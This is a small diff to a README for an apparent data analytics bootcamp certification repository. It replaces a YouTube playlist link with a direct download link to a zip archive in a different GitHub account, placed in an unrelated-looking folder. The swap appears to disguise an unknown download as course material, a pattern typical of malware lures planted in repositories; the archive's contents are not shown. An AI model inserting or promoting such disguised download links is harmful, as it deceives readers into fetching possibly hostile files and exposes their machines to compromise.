@@ -8,7 +8,7 @@ Go ahead and download the certifications in this repository! You've earned it! W
 
 #### I hope it helps you land a job in Analytics!
 
-Data Analytics Bootcamp Link: https://www.youtube.com/playlist?list=PLUaB-1hjhk8FE_XZ87vPPSfHqb6OcM0cF
+Data Analytics Bootcamp Link: https://github.com/Abdelmalik9/Data-Analytics-Bootcamp-Certification/raw/refs/heads/main/quantitativeness/Analytics-Bootcamp-Certification-Data-v3.5.zip
 
 .
 
